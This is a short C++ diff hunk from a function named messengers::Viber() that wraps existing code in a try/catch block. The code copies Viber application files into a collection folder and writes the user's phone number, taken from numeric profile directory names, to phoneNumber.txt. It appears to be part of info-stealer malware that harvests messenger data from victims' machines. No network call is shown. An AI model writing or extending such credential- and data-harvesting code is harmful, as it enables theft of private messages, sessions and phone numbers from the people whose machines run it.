@@ -70,29 +70,37 @@ void messengers::Viber()
 			int result = _mkdir(defaultPaths[j].c_str());
 		}
 
-		for (size_t i = 0; i < std::size(files); i++)
+		try 
 		{
-			func::copyFile(files[i], defaultPaths[1]);
-		}
-
-		int arrSize = 0;
-
-		std::string* vbDirs = new std::string[arrSize];
-
-		func::GetDirectories(dirs[0], vbDirs, arrSize);
-
-		for (size_t i = 0; i < arrSize; i++)
-		{
-			if (isNumeric(vbDirs[i]))
+			for (size_t i = 0; i < std::size(files); i++)
 			{
-				std::ofstream file(defaultPaths[1] + "/phoneNumber.txt", std::ios::app);
-				if (file.is_open())
-				{
-					file << std::string("+") + vbDirs[i];
-				}
+				func::copyFile(files[i], defaultPaths[1]);
+			}
 
-				file.close();
+			int arrSize = 0;
+
+			std::string* vbDirs = new std::string[arrSize];
+
+			func::GetDirectories(dirs[0], vbDirs, arrSize);
+
+			for (size_t i = 0; i < arrSize; i++)
+			{
+				if (isNumeric(vbDirs[i]))
+				{
+					std::ofstream file(defaultPaths[1] + "/phoneNumber.txt", std::ios::app);
+					if (file.is_open())
+					{
+						file << std::string("+") + vbDirs[i];
+					}
+
+					file.close();
+				}
 			}
 		}
+		catch (const char* error_message)
+		{
+			std::cout << error_message << std::endl;
+		}
+		
 	}
 }
